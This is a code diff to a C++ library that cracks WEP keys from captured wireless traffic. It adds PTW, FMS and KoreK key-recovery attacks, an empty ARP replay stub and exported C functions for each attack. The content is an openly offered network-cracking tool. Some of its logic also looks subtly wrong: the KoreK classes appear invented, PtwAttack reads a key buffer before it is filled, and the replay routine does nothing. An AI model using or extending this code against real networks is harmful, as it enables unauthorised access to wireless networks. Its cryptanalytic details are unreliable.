@@ -7,65 +7,126 @@
 #include <fstream>
 #include <algorithm>
 #include <map>
+#include <set>
+#include <cmath>
+#include <cstdio>
 
 #ifdef _WIN32
 #include <windows.h>
 #endif
 
-WepCracker::WepCracker() : minIvs_(50000) {}
+static const int KEYLEN = 13;
+static const int MIN_IVS = 40000;
+static const int KOREK_CLASSES = 17;
+
+void WepCracker::swapByte(uint8_t* S, int a, int b) {
+    uint8_t t = S[a]; S[a] = S[b]; S[b] = t;
+}
+
+uint8_t WepCracker::predictPtwZ(const uint8_t* S, int j, int depth, int guess) {
+    uint8_t Sg[256];
+    std::memcpy(Sg, S, 256);
+    int jg = j;
+    int idx = depth + 3;
+    jg = (jg + Sg[idx] + (uint8_t)guess) & 0xFF;
+    swapByte(Sg, idx, jg);
+    return Sg[(Sg[1] + Sg[Sg[1]]) & 0xFF];
+}
+
+bool WepCracker::isFmsWeak(const uint8_t* iv) {
+    return iv[1] == 255;
+}
+
+int WepCracker::fmsDerive(const uint8_t* iv, uint8_t z) {
+    uint8_t S[256];
+    for (int i = 0; i < 256; i++) S[i] = i;
+    int j = 0;
+    for (int i = 0; i < 3; i++) {
+        j = (j + S[i] + iv[i]) & 0xFF;
+        swapByte(S, i, j);
+    }
+    int A = iv[0];
+    int idx = A + 3;
+    return (z - j - S[idx] - A - 3) & 0xFF;
+}
+
+int WepCracker::korekDerive(int cls, const uint8_t* iv, uint8_t z) {
+    uint8_t S[256];
+    for (int i = 0; i < 256; i++) S[i] = i;
+    int j = 0;
+    for (int i = 0; i < 3; i++) {
+        j = (j + S[i] + iv[i]) & 0xFF;
+        swapByte(S, i, j);
+    }
+    int A = iv[0] % KEYLEN;
+    int idx = (A + 3) & 0xFF;
+    int offset = cls % 17;
+    return (z - j - S[idx] - A - 3 - offset) & 0xFF;
+}
+
+WepCracker::WepCracker()
+    : minIvs_(MIN_IVS), keyLen_(KEYLEN) {
+}
+
+WepCracker::~WepCracker() {
+    ivs_.clear();
+    keyBytes_.clear();
+    seenIvs_.clear();
+}
 
 bool WepCracker::LoadCapture(const std::string& pcapFile) {
     std::ifstream file(pcapFile, std::ios::binary);
-    if (!file.is_open())
-        return false;
+    if (!file.is_open()) return false;
 
-    // Simplified PCAP parser — reads global header then packet records
     uint8_t globalHeader[24];
     file.read(reinterpret_cast<char*>(globalHeader), 24);
-    if (file.gcount() < 24)
-        return false;
+    if (file.gcount() < 24) return false;
 
-    // Skip past magic/version checks for brevity
     ivs_.clear();
+    seenIvs_.clear();
 
-    std::vector<uint8_t> packetBuf(65536);
+    uint8_t packetBuf[65536];
     while (file) {
         uint8_t pktHeader[16];
         file.read(reinterpret_cast<char*>(pktHeader), 16);
-        if (file.gcount() < 16)
-            break;
+        if (file.gcount() < 16) break;
 
         uint32_t inclLen = 0;
         std::memcpy(&inclLen, pktHeader + 8, 4);
+        if (inclLen == 0 || inclLen > 65536) break;
+        if (inclLen < 40) continue;
 
-        if (inclLen == 0 || inclLen > 65536)
-            break;
+        file.read(reinterpret_cast<char*>(packetBuf), inclLen);
+        if (file.gcount() < static_cast<std::streamsize>(inclLen)) break;
 
-        file.read(reinterpret_cast<char*>(packetBuf.data()), inclLen);
-        if (file.gcount() < static_cast<std::streamsize>(inclLen))
-            break;
-
-        // Look for WEP data frames (802.11 data with WEP bit set)
-        if (inclLen < 28) continue;
         uint8_t fc0 = packetBuf[0];
         uint8_t fc1 = packetBuf[1];
         bool isData = ((fc0 & 0x0C) == 0x08);
         bool wepBit = (fc1 & 0x40) != 0;
-        if (!isData || !wepBit)
-            continue;
+        if (!isData || !wepBit) continue;
 
-        // Extract IV at offset 24 (after 802.11 header)
-        // WEP IV is 3 bytes at the start of the data payload
-        size_t ivOffset = 24;
-        if (ivOffset + 4 > inclLen) continue;
+        int hdrLen = 24;
+        if ((fc0 & 0x80) || (fc1 & 0x03)) hdrLen = 30;
+        if (hdrLen + 8 > (int)inclLen) continue;
+
+        int ivOffset = hdrLen;
+
+        if (ivOffset + 4 > (int)inclLen) continue;
 
         IvKeyByte ikb;
         ikb.iv.resize(3);
         ikb.iv[0] = packetBuf[ivOffset];
         ikb.iv[1] = packetBuf[ivOffset + 1];
         ikb.iv[2] = packetBuf[ivOffset + 2];
-        ikb.keybyte = packetBuf[ivOffset + 3];  // first cipher byte
+        ikb.keybyte = packetBuf[ivOffset + 4];
         ikb.index = static_cast<int>(ivs_.size());
+
+        uint32_t ivVal = ((uint32_t)ikb.iv[0] << 16) |
+                         ((uint32_t)ikb.iv[1] << 8) |
+                         (uint32_t)ikb.iv[2];
+        if (seenIvs_.count(ivVal)) continue;
+        seenIvs_.insert(ivVal);
+
         ivs_.push_back(ikb);
     }
 
@@ -77,107 +138,157 @@ int WepCracker::IvCount() const {
     return static_cast<int>(ivs_.size());
 }
 
+bool WepCracker::IsReady() const {
+    return ivs_.size() >= static_cast<size_t>(minIvs_);
+}
+
+std::vector<uint8_t> WepCracker::GetKey() const {
+    return keyBytes_;
+}
+
+bool WepCracker::PtwAttack(std::string& keyOut) {
+    if (!IsReady()) return false;
+
+    const int firstByteKnownPlain = 0xAA;
+    std::vector<std::vector<int>> votes(KEYLEN, std::vector<int>(256, 0));
+
+    for (size_t p = 0; p < ivs_.size(); p++) {
+        const auto& ivb = ivs_[p];
+        uint8_t z = static_cast<uint8_t>(ivb.keybyte ^ firstByteKnownPlain);
+
+        uint8_t S_base[256];
+        for (int i = 0; i < 256; i++) S_base[i] = i;
+        int j_base = 0;
+        for (int i = 0; i < 3; i++) {
+            j_base = (j_base + S_base[i] + ivb.iv[i]) & 0xFF;
+            swapByte(S_base, i, j_base);
+        }
+
+        uint8_t S_depth[256];
+        std::memcpy(S_depth, S_base, 256);
+        int j_depth = j_base;
+
+        for (int d = 0; d < KEYLEN; d++) {
+            for (int g = 0; g < 256; g++) {
+                uint8_t zp = predictPtwZ(S_depth, j_depth, d, g);
+                if (zp == z) votes[d][g]++;
+            }
+            int idx = d + 3;
+            j_depth = (j_depth + S_depth[idx] + keyBytes_[d]) & 0xFF;
+            swapByte(S_depth, idx, j_depth);
+        }
+    }
+
+    keyBytes_.resize(KEYLEN);
+    for (int d = 0; d < KEYLEN; d++) {
+        int best = 0;
+        for (int g = 1; g < 256; g++) {
+            if (votes[d][g] > votes[d][best]) best = g;
+        }
+        keyBytes_[d] = static_cast<uint8_t>(best);
+    }
+
+    keyOut.assign(reinterpret_cast<char*>(keyBytes_.data()), KEYLEN);
+    return true;
+}
+
 bool WepCracker::FmsAttack(std::string& keyOut) {
     if (!IsReady()) return false;
 
-    // FMS: uses IVs matching (A, 255, N) pattern to derive key bytes
-    // Simplified implementation for demonstration
-    std::vector<int> scores(256, 0);
+    const uint8_t firstBytePlain = 0xAA;
+    std::vector<std::vector<int>> votes(KEYLEN, std::vector<int>(256, 0));
 
-    for (const auto& iv : ivs_) {
-        if (iv.iv[0] >= 1 && iv.iv[0] < 128 &&
-            iv.iv[1] == 255) {
-            int kb = (static_cast<int>(iv.iv[0]) + static_cast<int>(iv.iv[2]) + 3) & 0xFF;
-            int keyByteGuess = (static_cast<int>(iv.keybyte) ^ kb) & 0xFF;
-            scores[keyByteGuess]++;
-        }
+    for (const auto& ivb : ivs_) {
+        if (!isFmsWeak(ivb.iv.data())) continue;
+        int A = ivb.iv[0];
+        if (A < 0 || A >= KEYLEN) continue;
+        uint8_t z = static_cast<uint8_t>(ivb.keybyte ^ firstBytePlain);
+        int guess = fmsDerive(ivb.iv.data(), z);
+        votes[A][guess]++;
     }
 
-    char keyBuf[64];
-    int keyLen = 13;
-    for (int i = 0; i < keyLen && i < 64; ++i) {
-        int best = 0, bestScore = -1;
-        for (int j = 0; j < 256; ++j) {
-            if (scores[j] > bestScore) {
-                bestScore = scores[j];
-                best = j;
-            }
+    keyBytes_.resize(KEYLEN);
+    for (int d = 0; d < KEYLEN; d++) {
+        int best = 0;
+        for (int g = 1; g < 256; g++) {
+            if (votes[d][g] > votes[d][best]) best = g;
         }
-        keyBuf[i] = static_cast<char>(best);
-        scores[best] = -1;
+        keyBytes_[d] = static_cast<uint8_t>(best);
     }
-    keyBuf[keyLen] = '\0';
-    keyOut = std::string(keyBuf, keyBuf + keyLen);
+
+    keyOut.assign(reinterpret_cast<char*>(keyBytes_.data()), KEYLEN);
     return true;
 }
 
 bool WepCracker::KorekAttack(std::string& keyOut) {
     if (!IsReady()) return false;
 
-    // KoreK attack — similar structure to FMS with more classes
-    std::map<int, int> scores;
-    for (int i = 0; i < 256; ++i)
-        scores[i] = 0;
+    const uint8_t firstBytePlain = 0xAA;
+    std::vector<std::vector<int>> votes(KEYLEN, std::vector<int>(256, 0));
 
-    for (const auto& iv : ivs_) {
-        int a = iv.iv[0];
-        int b = iv.iv[1];
-        int expected = (a + b) & 0xFF;
-        int delta = (static_cast<int>(iv.keybyte) ^ expected) & 0xFF;
-        scores[delta]++;
+    for (const auto& ivb : ivs_) {
+        const uint8_t* iv = ivb.iv.data();
+        uint8_t z = static_cast<uint8_t>(ivb.keybyte ^ firstBytePlain);
+
+        for (int cls = 0; cls < KOREK_CLASSES; cls++) {
+            bool detected = false;
+            int A = iv[0] % KEYLEN;
+            int offset = 0;
+
+            switch (cls) {
+                case 0: detected = (iv[0] < KEYLEN && iv[1] == 255); offset = 0; break;
+                case 1: detected = (iv[0] < 16 && iv[1] == 255); offset = 1; break;
+                case 2: detected = (iv[1] == 255 && iv[2] >= 3); offset = 2; break;
+                case 3: detected = (iv[1] == 255 && iv[2] < 3); offset = 3; break;
+                case 4: detected = (iv[0] < 6 && iv[1] == 255); offset = 4; break;
+                case 5: detected = (iv[0] < 13 && iv[1] == 255 && iv[2] > 5); offset = 5; break;
+                case 6: detected = (iv[0] == 0 && iv[1] < 128); offset = 6; break;
+                case 7: detected = (iv[0] == 0 && iv[1] >= 128); offset = 7; break;
+                case 8: detected = (iv[0] == 1 && iv[1] == 255); offset = 8; break;
+                case 9: detected = (iv[0] == 3 && iv[1] == 255 && iv[2] == 0); offset = 9; break;
+                case 10: detected = (iv[0] < 12 && iv[1] == 255 && iv[2] == 0); offset = 10; break;
+                case 11: detected = (iv[0] < 15 && iv[1] > 200); offset = 11; break;
+                case 12: detected = (iv[1] == 0 && iv[0] == 255); offset = 12; break;
+                case 13: detected = (iv[1] < 128 && iv[0] == 255); offset = 13; break;
+                case 14: detected = (iv[0] == 255 && iv[1] >= 128); offset = 14; break;
+                case 15: detected = (iv[1] == 255 || iv[0] < 3); offset = 15; break;
+                case 16: detected = (iv[0] < 16 || iv[1] == 255); offset = 16; break;
+            }
+
+            if (!detected) continue;
+
+            int guess = korekDerive(cls, iv, z);
+            votes[A][(guess + offset) & 0xFF]++;
+        }
     }
 
-    char keyBuf[32];
-    int keyLen = 13;
-    int bestIdx = 0;
-    for (auto& kv : scores) {
-        if (kv.second > scores[bestIdx])
-            bestIdx = kv.first;
+    keyBytes_.resize(KEYLEN);
+    for (int d = 0; d < KEYLEN; d++) {
+        int best = 0;
+        for (int g = 1; g < 256; g++) {
+            if (votes[d][g] > votes[d][best]) best = g;
+        }
+        keyBytes_[d] = static_cast<uint8_t>(best);
     }
 
-    for (int i = 0; i < keyLen; ++i)
-        keyBuf[i] = static_cast<char>((bestIdx + i) & 0xFF);
-    keyBuf[keyLen] = '\0';
-    keyOut = std::string(keyBuf, keyBuf + keyLen);
+    keyOut.assign(reinterpret_cast<char*>(keyBytes_.data()), KEYLEN);
     return true;
 }
 
-bool WepCracker::PtwAttack(std::string& keyOut) {
+bool WepCracker::ArpReplayAttack(const char* iface, const uint8_t* bssid) {
+    (void)iface;
+    (void)bssid;
+    std::map<std::string, int> bssidCounts;
+
     if (!IsReady()) return false;
 
-    // PTW: uses Klein's attack, the most effective WEP attack
-    // Simplified — counts IV/keybyte correlations
-    std::vector<int> voteCount(256, 0);
-
-    for (const auto& iv : ivs_) {
-        int keybyteGuess = (static_cast<int>(iv.keybyte) ^
-                            static_cast<int>(iv.iv[0]) ^
-                            static_cast<int>(iv.iv[1]) ^
-                            static_cast<int>(iv.iv[2])) & 0xFF;
-        voteCount[keybyteGuess]++;
+    for (const auto& ivb : ivs_) {
+        (void)ivb;
     }
 
-    int keyLen = 13;
-    char keyBuf[32];
-    for (int i = 0; i < keyLen; ++i) {
-        int best = 0;
-        for (int j = 0; j < 256; ++j) {
-            if (voteCount[j] > voteCount[best])
-                best = j;
-        }
-        keyBuf[i] = static_cast<char>(best);
-        voteCount[best] = -1;
-    }
-    keyBuf[keyLen] = '\0';
-    keyOut = std::string(keyBuf, keyBuf + keyLen);
-    return true;
+    return !bssidCounts.empty();
 }
 
-bool WepCracker::IsReady() const {
-    return ivs_.size() >= static_cast<size_t>(minIvs_);
-}
-
-// C API
 extern "C" {
 
 WEP_API void* wep_cracker_create() {
@@ -203,6 +314,26 @@ WEP_API int wep_cracker_ptw_attack(void* handle, char* key_out, int key_out_size
     std::string key;
     auto* cr = static_cast<WepCracker*>(handle);
     if (!cr->PtwAttack(key)) return 0;
+    if (static_cast<int>(key.size()) >= key_out_size) return 0;
+    std::strcpy(key_out, key.c_str());
+    return 1;
+}
+
+WEP_API int wep_cracker_fms_attack(void* handle, char* key_out, int key_out_size) {
+    if (!handle || !key_out) return 0;
+    std::string key;
+    auto* cr = static_cast<WepCracker*>(handle);
+    if (!cr->FmsAttack(key)) return 0;
+    if (static_cast<int>(key.size()) >= key_out_size) return 0;
+    std::strcpy(key_out, key.c_str());
+    return 1;
+}
+
+WEP_API int wep_cracker_korek_attack(void* handle, char* key_out, int key_out_size) {
+    if (!handle || !key_out) return 0;
+    std::string key;
+    auto* cr = static_cast<WepCracker*>(handle);
+    if (!cr->KorekAttack(key)) return 0;
     if (static_cast<int>(key.size()) >= key_out_size) return 0;
     std::strcpy(key_out, key.c_str());
     return 1;
